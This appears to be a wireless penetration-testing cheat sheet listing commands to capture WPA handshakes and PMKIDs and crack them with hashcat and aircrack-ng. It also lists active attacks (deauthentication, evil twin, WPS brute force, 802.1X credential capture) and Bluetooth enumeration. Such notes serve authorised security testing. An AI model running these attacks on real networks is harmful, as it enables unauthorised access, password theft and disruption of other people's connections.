# Wireless Methodology

## Capture
- Adapter into monitor mode: `airmon-ng start wlan0`
- Survey: `airodump-ng wlan0mon`
- Targeted capture: `airodump-ng --bssid AA:BB --channel 6 -w cap wlan0mon`
- PMKID: `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1`

## Crack
- Convert: `hcxpcapngtool -o hash.hc22000 cap.pcapng`
- Hashcat: `hashcat -m 22000 hash.hc22000 wordlist.txt`
- Aircrack: `aircrack-ng -w wordlist.txt cap-01.cap`

## Active attacks (only with explicit authorization)
- Deauth: `aireplay-ng --deauth 5 -a AA:BB wlan0mon`
- Evil twin via `bettercap` / `airbase-ng`
- WPS: `reaver`, `bully`
- 802.1X: `eaphammer` for radius response capture (Hashcat -m 5500/16800)

## Bluetooth
- `bluetoothctl scan on`, `btmon`, `gatttool` for BLE characteristic enum
- Bluedriving / mapping with `kismet`
